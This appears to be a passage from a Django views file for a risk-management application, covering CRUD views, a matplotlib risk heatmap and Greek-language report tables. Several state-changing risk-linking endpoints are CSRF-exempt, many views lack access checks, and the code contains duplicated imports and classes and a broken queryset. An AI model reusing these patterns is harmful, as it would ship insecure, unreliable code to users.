    def get(self, request, pk):
        approval_request = get_object_or_404(ApprovalRequest, pk=pk)
        form = ApprovalRequestForm(instance=approval_request)
        return render(request, 'approval_requests/approval_request_form.html', {'form': form, 'approval_request': approval_request})

    def post(self, request, pk):
        approval_request = get_object_or_404(ApprovalRequest, pk=pk)
        form = ApprovalRequestForm(request.POST, instance=approval_request)
        if form.is_valid():
            form.save()
            return redirect('approval_request_list')
        return render(request, 'approval_requests/approval_request_form.html', {'form': form, 'approval_request': approval_request})


class ApprovalRequestDeleteView(DeleteView):
    model = ApprovalRequest
    template_name = 'approval_requests/approval_request_confirm_delete.html'
    success_url = reverse_lazy('approval_request_list')







from django.shortcuts import render
from django.contrib.auth.decorators import user_passes_test
from django.db.models import Count
from .models import ApprovalRequest, UserProfile, Portfolio

def is_admin(user):
    return user.is_superuser

from django.utils.timezone import now
from django.shortcuts import render
from django.contrib.auth.decorators import user_passes_test
from .models import ApprovalRequest

@user_passes_test(is_admin)
def approval_control_view(request):
    # Retrieve approval requests that are pending or due
    approval_requests = ApprovalRequest.objects.select_related('user', 'risk__portfolio') \
        .filter(due_date__lte=now())  # Only include approvals where due_date is today or in the past

    # Organizing data per User -> Portfolio -> Status
    user_portfolio_status = {}

    for approval in approval_requests:
        user = approval.user.user.username  # User
        portfolio = approval.risk.portfolio.name if approval.risk.portfolio else "No Portfolio"
        status = approval.status

        # Organize data hierarchically
        user_portfolio_status.setdefault(user, {}).setdefault(portfolio, {}).setdefault(status, []).append(approval)

    context = {
        "user_portfolio_status": user_portfolio_status
    }

    return render(request, "admin/approval_control.html", context)


from django.shortcuts import render
from django.contrib.auth.decorators import user_passes_test
from django.utils.timezone import now
from datetime import timedelta
from .models import Risk, ApprovalRequest, UserProfile

def is_admin(user):
    return user.is_superuser

from django.shortcuts import render
from django.contrib.auth.decorators import user_passes_test
from django.utils.timezone import now
from datetime import timedelta
from .models import Risk, ApprovalRequest, UserProfile

def is_admin(user):
    return user.is_superuser

from collections import defaultdict
from django.utils.timezone import now
from django.shortcuts import render
from datetime import timedelta
from django.contrib.auth.decorators import user_passes_test
from .models import Risk


from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from django.views.generic.edit import DeleteView
from django.urls import reverse_lazy
from .models import Indicator
from .forms import IndicatorForm

from django.shortcuts import render, redirect
from django.views import View
from django.db.models import Q

from django.views.generic import ListView
from django.shortcuts import redirect
from django.db.models import Q
from .models import Indicator

class IndicatorListView(ListView):
    model = Indicator
    template_name = 'indicators/indicator_list.html'
    context_object_name = 'indicators'

    def get_queryset(self):
        """
        Return indicators associated with the user's portfolios or owned by the user.
        """
        if not self.request.user.is_authenticated:
            # Redirect to login page if the user is not authenticated
            return redirect('login')

        user_profile = self.request.user.userprofile  # Assuming `UserProfile` is linked to `User`
        return Indicator.objects.filter(
            Q(portfolio__in=user_profile.portfolios.all()) |  # User's portfolios
            Q(owner=user_profile)  # User is the owner
        ).distinct()
class IndicatorDetailView(View):
    def get(self, request, pk):
        indicator = get_object_or_404(Indicator, pk=pk)
        return render(request, 'indicators/indicator_detail.html', {'indicator': indicator})


class IndicatorCreateView(View):
    def get(self, request):
        form = IndicatorForm()
        return render(request, 'indicators/indicator_form.html', {'form': form})

    def post(self, request):
        form = IndicatorForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('indicator_list')
        return render(request, 'indicators/indicator_form.html', {'form': form})


class IndicatorUpdateView(View):
    def get(self, request, pk):
        indicator = get_object_or_404(Indicator, pk=pk)
        form = IndicatorForm(instance=indicator)
        return render(request, 'indicators/indicator_form.html', {'form': form, 'indicator': indicator})

    def post(self, request, pk):
        indicator = get_object_or_404(Indicator, pk=pk)
        form = IndicatorForm(request.POST, instance=indicator)
        if form.is_valid():
            form.save()
            return redirect('indicator_list')
        return render(request, 'indicators/indicator_form.html', {'form': form, 'indicator': indicator})


from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from django.views.generic.edit import DeleteView
from django.urls import reverse_lazy
from .models import Indicator
from .forms import IndicatorForm

from django.shortcuts import render, redirect
from django.db.models import Q
from .models import Indicator

class IndicatorListView(View):
    def get(self, request):
        if not request.user.is_authenticated:
            # Redirect to login page if the user is not authenticated
            return redirect('login')

        # Get the user's profile
        user_profile = request.user.userprofile  # Assuming UserProfile is linked to User

        # Filter indicators based on the user's portfolios or ownership
        indicators = Indicator.objects.filter(
            Q(portfolio__in=user_profile.portfolios.all()) |  # User's portfolios
            Q(owner=user_profile)  # User is the owner
        ).distinct()

        return render(request, 'indicators/indicator_list.html', {'indicators': indicators})

class IndicatorDetailView(View):
    def get(self, request, pk):
        indicator = get_object_or_404(Indicator, pk=pk)
        return render(request, 'indicators/indicator_detail.html', {'indicator': indicator})


class IndicatorCreateView(View):
    def get(self, request):
        form = IndicatorForm()
        return render(request, 'indicators/indicator_form.html', {'form': form})

    def post(self, request):
        form = IndicatorForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('indicator_list')
        return render(request, 'indicators/indicator_form.html', {'form': form})


class IndicatorUpdateView(View):
    def get(self, request, pk):
        indicator = get_object_or_404(Indicator, pk=pk)
        form = IndicatorForm(instance=indicator)
        return render(request, 'indicators/indicator_form.html', {'form': form, 'indicator': indicator})

    def post(self, request, pk):
        indicator = get_object_or_404(Indicator, pk=pk)
        form = IndicatorForm(request.POST, instance=indicator)
        if form.is_valid():
            form.save()
            return redirect('indicator_list')
        return render(request, 'indicators/indicator_form.html', {'form': form, 'indicator': indicator})


class IndicatorDeleteView(DeleteView):
    model = Indicator
    template_name = 'indicators/indicator_confirm_delete.html'
    success_url = reverse_lazy('indicator_list')


from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from django.views.generic.edit import DeleteView
from django.urls import reverse_lazy
from .models import Procedure
from .forms import ProcedureForm

from django.views import View
from django.shortcuts import render
from django.http import HttpResponseForbidden
from .models import Procedure  # Adjust import based on your app structure

from django.views import View
from django.shortcuts import render
from django.http import HttpResponseForbidden
from .models import Procedure, UserProfile, Portfolio  # Adjust imports

from django.views import View
from django.shortcuts import render
from django.http import HttpResponseForbidden
from .models import Procedure, UserProfile  # Adjust imports

from django.views import View
from django.shortcuts import render
from django.http import HttpResponseForbidden
from .models import Procedure, UserProfile

class ProcedureListView(View):
    def get(self, request):
        # Check if user is authenticated
        if not request.user.is_authenticated:
            return HttpResponseForbidden("You must be logged in to view procedures.")

        # Get the user's UserProfile
        try:
            user_profile = request.user.userprofile
        except UserProfile.DoesNotExist:
            return HttpResponseForbidden("No user profile found. Contact support.")

        # Get user's portfolios dynamically
        user_portfolios = user_profile.portfolios.all()
        if not user_portfolios.exists():
            return HttpResponseForbidden("You don’t have access to any portfolios.")

        # Filter procedures by user's portfolios
        procedures = Procedure.objects.filter(portfolio__in=user_portfolios)
        return render(request, 'procedures/procedure_list.html', {'procedures': procedures})


class ProcedureDetailView(View):
    def get(self, request, pk):
        procedure = get_object_or_404(Procedure, pk=pk)
        return render(request, 'procedures/procedure_detail.html', {'procedure': procedure})


class ProcedureCreateView(View):
    def get(self, request):
        form = ProcedureForm()
        return render(request, 'procedures/procedure_form.html', {'form': form})

    def post(self, request):
        form = ProcedureForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('procedure_list')
        return render(request, 'procedures/procedure_form.html', {'form': form})
from django.shortcuts import render, get_object_or_404, redirect
from django.views.generic import View
from django.views.generic.edit import DeleteView
from django.urls import reverse_lazy
from .models import Threat
from .forms import ThreatForm


from django.shortcuts import render, redirect
from django.db.models import Q
from .models import Threat
# --------------------------

from django.shortcuts import get_object_or_404, render
from django.contrib.auth.decorators import login_required
from django.utils.decorators import method_decorator
from orm.models import Threat, Risk, UserProfile

from django.shortcuts import render, get_object_or_404, redirect
from django.utils.html import strip_tags
from html import unescape
from django.contrib.auth.decorators import login_required
from django.utils.decorators import method_decorator
from .models import Threat, Risk, UserProfile

@method_decorator(login_required, name='dispatch')
class ThreatDetailView(View):
    def get(self, request, pk):
        """
        Display the details of a specific threat, including related and available risks.
        """
        # Fetch the specific threat
        threat = get_object_or_404(Threat, pk=pk)

        # Fetch user profile
        user_profile = UserProfile.objects.filter(user=request.user).first()

        # Fetch risks available to the user based on their portfolios
        if user_profile:
            user_portfolios = user_profile.portfolios.all()
            available_risks = Risk.objects.filter(portfolio__in=user_portfolios).exclude(
                id__in=threat.risks.all()
            ).distinct()
        else:
            available_risks = Risk.objects.none()

        # Risks already linked to this threat
        linked_risks = threat.risks.all()

        return render(request, 'threats/threat_detail.html', {
            'threat': threat,
            'linked_risks': linked_risks,
            'available_risks': available_risks,
        })

    def post(self, request, pk):
        """
        Handle form submission for updating the threat.
        """
        # Fetch the specific threat
        threat = get_object_or_404(Threat, pk=pk)

        # Clean the title and description before saving
        title = unescape(strip_tags(request.POST.get('title', threat.title)))  # Remove HTML tags and decode entities
        description = unescape(strip_tags(request.POST.get('description', threat.description)))  # Same for description

        threat.title = title
        threat.description = description
        threat.save()

        # Handle linked risks
        linked_risks = request.POST.getlist('linked_risks')
        if linked_risks:
            threat.risks.set(linked_risks)

        return redirect('threat_detail', pk=pk)  # Redirect to the same threat detail page




from django.views.decorators.csrf import csrf_exempt
@method_decorator(csrf_exempt, name='dispatch')
class ThreatLinkRiskView(View):
    def post(self, request, pk):
        try:
            threat = get_object_or_404(Threat, pk=pk)
            data = json.loads(request.body)
            risk_id = data.get('risk_id')

            if not risk_id:
                return JsonResponse({'success': False, 'error': 'Risk ID not provided.'}, status=400)

            risk = get_object_or_404(Risk, id=risk_id)
            threat.risks.add(risk)  # Link the risk to the threat

            return JsonResponse({'success': True, 'message': 'Risk linked successfully.'})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)}, status=500)
@method_decorator(csrf_exempt, name='dispatch')
class ThreatUnlinkRiskView(View):
    def post(self, request, pk):
        try:
            threat = get_object_or_404(Threat, pk=pk)
            data = json.loads(request.body)
            risk_id = data.get('risk_id')

            if not risk_id:
                return JsonResponse({'success': False, 'error': 'Risk ID not provided.'}, status=400)

            risk = get_object_or_404(Risk, id=risk_id)
            threat.risks.remove(risk)  # Unlink the risk from the threat

            return JsonResponse({'success': True, 'message': 'Risk unlinked successfully.'})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)}, status=500)
class ThreatCreateView(View):
    def get(self, request):
        form = ThreatForm()
        return render(request, 'threats/threat_form.html', {'form': form})

    def post(self, request):
        form = ThreatForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('threat_list')
        return render(request, 'threats/threat_form.html', {'form': form})


class ThreatUpdateView(View):
    def get(self, request, pk):
        threat = get_object_or_404(Threat, pk=pk)
        form = ThreatForm(instance=threat)
        return render(request, 'threats/threat_form.html', {'form': form, 'threat': threat})

    def post(self, request, pk):
        threat = get_object_or_404(Threat, pk=pk)
        form = ThreatForm(request.POST, instance=threat)
        if form.is_valid():
            form.save()
            return redirect('threat_list')
        return render(request, 'threats/threat_form.html', {'form': form, 'threat': threat})


class ThreatDeleteView(DeleteView):
    model = Threat
    template_name = 'threats/threat_confirm_delete.html'
    success_url = reverse_lazy('threat_list')

# ------------------

class ProcedureUpdateView(View):
    def get(self, request, pk):
        procedure = get_object_or_404(Procedure, pk=pk)
        form = ProcedureForm(instance=procedure)
        return render(request, 'procedures/procedure_form.html', {'form': form, 'procedure': procedure})

    def post(self, request, pk):
        procedure = get_object_or_404(Procedure, pk=pk)
        form = ProcedureForm(request.POST, instance=procedure)
        if form.is_valid():
            form.save()
            return redirect('procedure_list')
        return render(request, 'procedures/procedure_form.html', {'form': form, 'procedure': procedure})


class ProcedureDeleteView(DeleteView):
    model = Procedure
    template_name = 'procedures/procedure_confirm_delete.html'
    success_url = reverse_lazy('procedure_list')




from docx.shared import Pt

from django.contrib.auth.decorators import permission_required
# Now include this in the generate_annual_report function

from django.http import HttpResponse
from docx import Document
from django.contrib.staticfiles import finders
import subprocess

import socket
import netifaces
import nmap
from django.http import JsonResponse

import zipfile
from io import BytesIO

from django.shortcuts import render
from .models import Risk, UserProfile
from datetime import datetime
from django.contrib.auth.decorators import login_required
# import plotly.express as px
# from plotly.offline import plot

from django.shortcuts import render
from django.views.generic import ListView, DetailView
from .models import Action

from django.contrib.auth.models import User
from django.urls import reverse_lazy
from django.views.generic import UpdateView, CreateView
from django.contrib.messages.views import SuccessMessageMixin
from .models import Portfolio


class PortfolioUpdateView(SuccessMessageMixin, UpdateView):
    model = Portfolio
    fields = ['name', 'description']
    template_name = 'portfolios/portfolio_detail.html'
    context_object_name = 'portfolio'
    success_message = "Portfolio updated successfully!"

    def get_success_url(self):
        return reverse_lazy('portfolio_list')  # Redirect to the list view after saving


class PortfolioCreateView(SuccessMessageMixin, CreateView):
    model = Portfolio
    fields = ['name', 'description']
    template_name = 'portfolios/portfolio_add.html'
    success_message = "Portfolio created successfully!"

    def form_valid(self, form):
        portfolio = form.save(commit=False)  # Create a Portfolio instance but don't save it to the database yet
        portfolio.save()  # Save to the database to get an ID
        
        # Assign the current user as the owner
        current_user = self.request.user
        portfolio.user_profiles.add(current_user.userprofile)

        # Optionally assign the superuser
        super_user = User.objects.filter(is_superuser=True).first()
        if super_user:
            portfolio.user_profiles.add(super_user.userprofile)

        return super().form_valid(form)

    def get_success_url(self):
        return reverse_lazy('portfolio_list')  # Redirect to the list view after creation


# -----------------------------






from django.urls import reverse_lazy
from django.views.generic import CreateView, UpdateView
from .models import Action


from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from .models import Category
from .forms import CategoryForm

from django.shortcuts import render, redirect
from django.views import View
from .models import Category

class CategoryListView(View):
    def get(self, request):
        categories = Category.objects.all().order_by('name')  # Sort categories alphabetically
        return render(request, 'categories/category_list.html', {'categories': categories})

from django.views.generic.edit import CreateView
from django.urls import reverse_lazy
from .models import Category

class CategoryCreateView(CreateView):
    model = Category
    fields = ['name', 'description']  # Adjust fields as per your model
    template_name = 'categories/category_form.html'
    success_url = reverse_lazy('category_list')  # Redirect to the category list after adding


class CategoryDetailView(View):
    def get(self, request, pk):
        category = get_object_or_404(Category, pk=pk)
        form = CategoryForm(instance=category)
        return render(request, 'categories/category_detail.html', {'form': form, 'category': category})

    def post(self, request, pk):
        category = get_object_or_404(Category, pk=pk)
        form = CategoryForm(request.POST, instance=category)
        if form.is_valid():
            form.save()
            return redirect('category_list')
        return render(request, 'categories/category_detail.html', {'form': form, 'category': category})


# ------------------------


from django.contrib.auth.views import PasswordResetView
from orm.forms import CustomPasswordResetForm

from django.contrib.auth.views import PasswordResetView
from orm.forms import CustomPasswordResetForm

# class CustomPasswordResetView(PasswordResetView):
#     form_class = CustomPasswordResetForm




# -------------------------

from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from .models import Opportunity
from .forms import OpportunityForm

from django.db.models import Q
from django.shortcuts import render, redirect
from .models import Opportunity

from django.shortcuts import get_object_or_404, render, redirect
from django.views import View
from .models import Opportunity, Risk

from django.views import View
from django.shortcuts import render, get_object_or_404, redirect
from .forms import OpportunityForm  # Create this form
from .models import Opportunity

from django.views import View
from django.shortcuts import render, get_object_or_404, redirect
from .forms import OpportunityForm  # Ensure you create this form
from .models import Opportunity

from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from .forms import OpportunityForm
from .models import Opportunity

class OpportunityUpdateView(View):
    def get(self, request, pk):
        # Fetch the Opportunity instance
        opportunity = get_object_or_404(Opportunity, pk=pk)
        # Pass the instance to the form
        form = OpportunityForm(instance=opportunity)
        return render(request, 'opportunities/opportunity_form.html', {
            'form': form,
            'opportunity': opportunity,
        })

    def post(self, request, pk):
        # Fetch the Opportunity instance
        opportunity = get_object_or_404(Opportunity, pk=pk)
        # Process form submission
        form = OpportunityForm(request.POST, instance=opportunity)
        if form.is_valid():
            form.save()
            return redirect('opportunity_list')  # Adjust redirect as needed
        return render(request, 'opportunities/opportunity_form.html', {
            'form': form,
            'opportunity': opportunity,
        })
from django.views import View
from django.shortcuts import redirect, render
from django.db.models import Q
from .models import Threat, Opportunity

class ThreatListView(View):
    def get(self, request):
        if not request.user.is_authenticated:
            return redirect('login')

        # Only superusers can view threats
        if not request.user.is_superuser:
            # Regular users get redirected or see empty list
            return render(request, 'threats/threat_list.html', {'threats': []})

        # Superuser sees all threats
        threats = Threat.objects.all().order_by('-updated_at')
        return render(request, 'threats/threat_list.html', {'threats': threats})

class OpportunityListView(View):
    def get(self, request):
        if not request.user.is_authenticated:
            return redirect('login')

        # Get the user's profile
        user_profile = request.user.userprofile  # Assuming UserProfile is linked to User

        # Superuser sees all opportunities, regular users see only their portfolio's opportunities
        if request.user.is_superuser:
            opportunities = Opportunity.objects.all().order_by('-updated_at')
        else:
            opportunities = Opportunity.objects.filter(
                Q(portfolio__in=user_profile.portfolios.all()) |  # User's portfolios
                Q(owner=user_profile)  # User is the owner
            ).distinct().order_by('-updated_at')

        return render(request, 'opportunities/opportunity_list.html', {'opportunities': opportunities})
from django.shortcuts import render, get_object_or_404, redirect
from django.http import JsonResponse
from django.views import View
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from django.contrib.auth.decorators import login_required
import json
from .models import Opportunity, Risk, UserProfile, Portfolio


from django.shortcuts import get_object_or_404, render, redirect
from django.utils.html import escape
from django.views import View
from .models import Opportunity, Risk, UserProfile

from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from django.utils.html import strip_tags
from django.views import View
from .models import Opportunity, Risk, UserProfile
from django.db.models import Q

from django.shortcuts import render, get_object_or_404, redirect
from django.views import View
from django.contrib import messages
from .models import Opportunity, Risk, UserProfile
from .forms import OpportunityForm

from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from django.utils.html import strip_tags
from html import unescape
from .models import Opportunity, Risk, UserProfile
from .forms import OpportunityForm

class OpportunityDetailView(View):
    def get(self, request, pk):
        """
        Display the details of a specific opportunity, including related and available risks.
        """
        # Fetch the opportunity instance
        opportunity = get_object_or_404(Opportunity, pk=pk)

        # Initialize the OpportunityForm with the opportunity instance
        form = OpportunityForm(instance=opportunity)

        # Fetch risks already linked to the opportunity
        related_risks = opportunity.risks.all()

        # Fetch risks available to the user based on their portfolios
        user_profile = UserProfile.objects.filter(user=request.user).first()
        if not user_profile:
            messages.error(request, "User profile not found.")
            return redirect('opportunity_list')

        user_portfolios = user_profile.portfolios.all()
        available_risks = Risk.objects.filter(
            portfolio__in=user_portfolios
        ).exclude(id__in=related_risks.values_list('id', flat=True))

        # Render the template with opportunity details
        return render(
            request,
            'opportunities/opportunity_detail.html',  # Correct template name
            {
                'form': form,
                'opportunity': opportunity,
                'related_risks': related_risks,
                'available_risks': available_risks,
            },
        )

    def post(self, request, pk):
        """
        Handle form submission for updating the opportunity.
        """
        # Fetch the opportunity instance
        opportunity = get_object_or_404(Opportunity, pk=pk)

        # Initialize the form with submitted data
        form = OpportunityForm(request.POST, instance=opportunity)

        if form.is_valid():
            # Clean and save the fields to prevent <p> tags and encoded characters
            opportunity.title = unescape(strip_tags(form.cleaned_data['title']))  # Remove tags and decode
            opportunity.description = unescape(strip_tags(form.cleaned_data['description']))  # Remove tags and decode
            opportunity.save()

            messages.success(request, "Opportunity updated successfully!")
            return redirect('opportunity_detail', pk=pk)

        # Fetch related and available risks again for re-rendering
        related_risks = opportunity.risks.all()
        user_profile = UserProfile.objects.filter(user=request.user).first()
        user_portfolios = user_profile.portfolios.all() if user_profile else []
        available_risks = Risk.objects.filter(
            portfolio__in=user_portfolios
        ).exclude(id__in=related_risks.values_list('id', flat=True))

        return render(
            request,
            'opportunities/opportunity_detail.html',
            {
                'form': form,
                'opportunity': opportunity,
                'related_risks': related_risks,
                'available_risks': available_risks,
            },
        )



@method_decorator(csrf_exempt, name='dispatch')
class LinkRiskView(View):
    def post(self, request, pk):
        try:
            opportunity = get_object_or_404(Opportunity, pk=pk)
            data = json.loads(request.body)
            risk_id = data.get('risk_id')

            if not risk_id:
                return JsonResponse({'success': False, 'error': 'Risk ID not provided.'}, status=400)

            risk = get_object_or_404(Risk, id=risk_id)
            opportunity.risks.add(risk)
            return JsonResponse({'success': True, 'message': 'Risk linked successfully.'})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)}, status=500)


@method_decorator(csrf_exempt, name='dispatch')
class UnlinkRiskView(View):
    def post(self, request, pk):
        try:
            opportunity = get_object_or_404(Opportunity, pk=pk)
            data = json.loads(request.body)
            risk_id = data.get('risk_id')

            if not risk_id:
                return JsonResponse({'success': False, 'error': 'Risk ID not provided.'}, status=400)

            risk = get_object_or_404(Risk, id=risk_id)
            opportunity.risks.remove(risk)
            return JsonResponse({'success': True, 'message': 'Risk unlinked successfully.'})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)}, status=500)

# ----------------------------

def generate_interactive_heatmap(title, data, score_data, risk_type, request):
    # Calculate total number of risks
    total_risks = sum(len(cell) for row in data for cell in row)
    
    # Get current user's username from the request
    username = request.user.username

    bounds = [0, 7, 15, 25]
    colors = ['green', 'orange', 'red']
    cmap = ListedColormap(colors)
    norm = BoundaryNorm(bounds, cmap.N)

    plt.figure(figsize=(6, 4))

    # Create heatmap
    ax = sns.heatmap(
        score_data[::-1],  # Reverse the y-axis data
        annot=False, 
        cmap=cmap, 
        norm=norm, 
        fmt="d", 
        linewidths=.5, 
        cbar=False
    )

    # Adjust title to include username and total number of risks
    ax.set_title(f"Risk Heatmap for {username} | Total Risks: {total_risks}", fontsize=10, weight='normal', wrap=True)
    ax.set_xlabel('Impact', fontsize=10)
    ax.set_ylabel('Likelihood', fontsize=10)
    ax.set_xticklabels(['1', '2', '3', '4', '5'], fontsize=8)
    ax.set_yticklabels(['5', '4', '3', '2', '1'], rotation=0, fontsize=8)  # Reverse the labels

    # Overlay the bubble chart
    x_coords = []
    y_coords = []
    bubble_sizes = []

    for i in range(5):
        for j in range(5):
            count = len(data[::-1][i][j])  # Use reversed data for counting risks
            if count > 0:
                # Coordinates of the bubble (x = impact, y = likelihood)
                x_coords.append(j + 0.5)
                y_coords.append(i + 0.5)
                bubble_sizes.append(count * 100)  # Adjust bubble size factor as needed

                # Display the count as text inside the bubble
                ax.text(j + 0.5, i + 0.5, f'{count}', 
                        ha='center', va='center', color='black', fontsize=10, weight='bold')

    # Add bubble chart (scatter plot)
    plt.scatter(x_coords, y_coords, s=bubble_sizes, alpha=0.5, color='blue', edgecolors='black')

    # Save the figure to a buffer
    buffer = io.BytesIO()
    plt.savefig(buffer, format='png')
    plt.close()
    buffer.seek(0)

    # Encode the image in base64
    image_base64 = base64.b64encode(buffer.read()).decode('utf-8')
    image_html = f"<img src='data:image/png;base64,{image_base64}' alt='Risk Heatmap' usemap='#{risk_type}_map'>"

    # Create an HTML image map for interactivity
    width, height = 600, 400  # Assuming 600x400 is the figure size in pixels
    cell_width = width / 5
    cell_height = height / 5

    map_html = f"<map name='{risk_type}_map'>"
    for i in range(5):
        for j in range(5):
            if len(data[::-1][i][j]) > 0:  # Use reversed data for map areas
                x1, y1 = j * cell_width, i * cell_height
                x2, y2 = (j + 1) * cell_width, (i + 1) * cell_height
                map_html += f"<area shape='rect' coords='{x1},{y1},{x2},{y2}' " \
                            f"href='#' onclick='showRiskDetails(\"{risk_type}\", {5-i}, {j+1});'>"
    map_html += "</map>"

    # Include the favicon in the HTML template with adjusted title size
    full_html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="icon" href="/static/images/favicon.png" type="image/png">
        <title>Risk Heatmap for {username} | Total Risks: {total_risks}</title>
    </head>
    <body>
        {image_html}
        {map_html}
    </body>
    </html>
    """

    return full_html

# Example view that generates and returns the HTML for heatmap

def risk_heatmap_view(request):
    # Example risk data (replace this with actual query logic)
    risks = Risk.objects.all()

    # Prepare data for heatmap
    data = [[[] for _ in range(5)] for _ in range(5)]  # Empty 5x5 grid
    score_data = [[0 for _ in range(5)] for _ in range(5)]  # Empty 5x5 score grid

    for risk in risks:
        likelihood = risk.likelihood - 1  # Assuming likelihood and impact are 1-5 scale
        impact = risk.impact - 1
        data[likelihood][impact].append(risk)
        score_data[likelihood][impact] += risk.score

    # Generate heatmap
    title = 'Risk Heatmap'
    risk_type = 'risk'
    heatmap_html = generate_interactive_heatmap(title, data, score_data, risk_type, request)

    # Build the HTML page directly in the view
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Risk Heatmap</title>
        <script>
            function showRiskDetails(riskType, likelihood, impact) {{
                // Logic to show risk details dynamically (e.g., modal popup or a new section)
                alert(`Risk Type: ${{riskType}}, Likelihood: ${{likelihood}}, Impact: ${{impact}}`);
            }}
        </script>
    </head>
    <body>
        <h1>Risk Heatmap</h1>
        <div>
            {heatmap_html} <!-- Insert the heatmap image with interactive map -->
        </div>
    </body>
    </html>
    """

    return HttpResponse(html_content)

from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json
from .models import Event, Risk, Portfolio

from django.http import JsonResponse

def add_event(request, risk_id):
    if not risk_id:
        return JsonResponse({'success': False, 'error': "Risk ID is missing or invalid."})

    try:
        # Ensure the risk_id is an integer
        risk_id = int(risk_id)

        # Fetch the risk object (assuming the Risk model exists)
        risk = Risk.objects.get(id=risk_id)

        # Handle event creation logic here...
        return JsonResponse({'success': True, 'message': 'Event created successfully!'})

    except Risk.DoesNotExist:
        return JsonResponse({'success': False, 'error': 'Risk does not exist.'})
    except ValueError:
        return JsonResponse({'success': False, 'error': 'Invalid Risk ID.'})
 

def add_risk_comments_gr(document, risk):
    # Απόκτηση βαθμολογιών (Εγγενές, Υπολειπόμενο, Στοχευόμενο)
    inherent_score = risk.inherent_score()  # Εγγενής βαθμολογία
    residual_score = risk.residual_score()  # Υπολειπόμενη βαθμολογία
    targeted_score = risk.targeted_score()  # Στοχευόμενη βαθμολογία

    # Check if mitigations exist for the risk
    has_mitigations = risk.mitigations.exists()  # Returns True if there are any mitigations

    # Προσθήκη κενής παραγράφου για νέα γραμμή πριν από τον πίνακα
    document.add_paragraph()  # Adds a new line (empty paragraph)

    # Δημιουργία πίνακα για τα σχόλια
    table = document.add_table(rows=4, cols=2)  # Add one more row to the table for the new comment
    table.style = 'Light Shading Accent 1'  # Prettier table style

    # Adjust borders for all cells to ensure they print correctly
    for row in table.rows:
        for cell in row.cells:
            set_cell_border(cell)

    # Πρώτη γραμμή πίνακα - Κεφαλίδες
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = "Τύπος Βαθμολογίας"  # Header: Score Type
    hdr_cells[1].text = "Σχόλια"  # Header: Comments

    # Δεύτερη γραμμή πίνακα - Εγγενής και Υπολειπόμενη βαθμολογία
    row_cells = table.rows[1].cells
    row_cells[0].text = "Εγγενής vs Υπολειπόμενη Βαθμολογία"  # Inherent vs Residual Score

    if residual_score < inherent_score:
        row_cells[1].text = f"Η μείωση ήταν αποτελεσματική καθώς η υπολειπόμενη βαθμολογία ({residual_score}) είναι χαμηλότερη από την εγγενή βαθμολογία ({inherent_score})."
        if not has_mitigations:
            # Highlighting the lack of mitigation with red text
            row_cells[1].add_paragraph()  # Add an extra line for the red warning
            warning_paragraph = row_cells[1].add_paragraph()
            warning_run = warning_paragraph.add_run("Ωστόσο, δεν υπάρχουν ενέργειες μετριασμού.")
            warning_run.font.color.rgb = RGBColor(255, 0, 0)  # Red color for highlighting
            warning_run.bold = True  # Bold text for emphasis
    else:
        row_cells[1].text = f"Η μείωση δεν ήταν αποτελεσματική καθώς η υπολειπόμενη βαθμολογία ({residual_score}) είναι παρόμοια με την εγγενή βαθμολογία ({inherent_score})."

    # Τρίτη γραμμή πίνακα - Στοχευόμενη και Υπολειπόμενη βαθμολογία
    row_cells = table.rows[2].cells
    row_cells[0].text = "Στοχευόμενη vs Υπολειπόμενη Βαθμολογία"  # Targeted vs Residual Score

    if targeted_score < residual_score:
        run = row_cells[1].paragraphs[0].add_run(
            f"Ωστόσο, απαιτούνται επιπλέον ενέργειες για την επίτευξη της στοχευόμενης βαθμολογίας ({targeted_score})."
        )
        run.font.color.rgb = RGBColor(255, 0, 0)  # Red color for the "however" case
    elif targeted_score == residual_score:
        row_cells[1].text = f"Δεν απαιτούνται επιπλέον ενέργειες καθώς η υπολειπόμενη βαθμολογία είναι ίση με την στοχευόμενη βαθμολογία ({targeted_score})."
    else:
        warning_text = (
            f"Η στοχευόμενη βαθμολογία ({targeted_score}) είναι χαμηλότερη από την υπολειπόμενη βαθμολογία, "
            "αλλά δεν έχουν αναληφθεί ενέργειες. Προειδοποίηση: Οι στοχευόμενες βαθμολογίες δεν μπορούν να μειωθούν χωρίς πρόσθετες ενέργειες."
        )
        row_cells[1].text = warning_text

        # Εφαρμογή πλάγιας γραφής (italic) στην προειδοποίηση
        warning_run = row_cells[1].paragraphs[0].runs[0]
        warning_run.italic = True

    # Προσθήκη τέταρτης γραμμής για σχολιασμό σε περίπτωση έλλειψης μετριασμού
    row_cells = table.rows[3].cells
    row_cells[0].text = "Σχόλια σχετικά με τη μείωση του κινδύνου χωρίς ενέργειες μετριασμού"  # New row for mitigation comments

    if not has_mitigations and residual_score < inherent_score:
        # Highlighting the lack of mitigation actions despite risk reduction
        row_cells[1].text = "Η υπολειπόμενη βαθμολογία έχει μειωθεί αλλά δεν υπάρχουν ενέργειες μετριασμού."
        row_cells[1].paragraphs[0].runs[0].font.color.rgb = RGBColor(255, 0, 0)  # Red color for warning
        row_cells[1].paragraphs[0].runs[0].bold = True  # Bold text for emphasis
    else:
        row_cells[1].text = "Υπάρχουν ενέργειες μετριασμού που υποστηρίζουν τη μείωση του κινδύνου."

def set_cell_border(cell):
    """
    Apply borders to the given cell to ensure they print properly.
    """
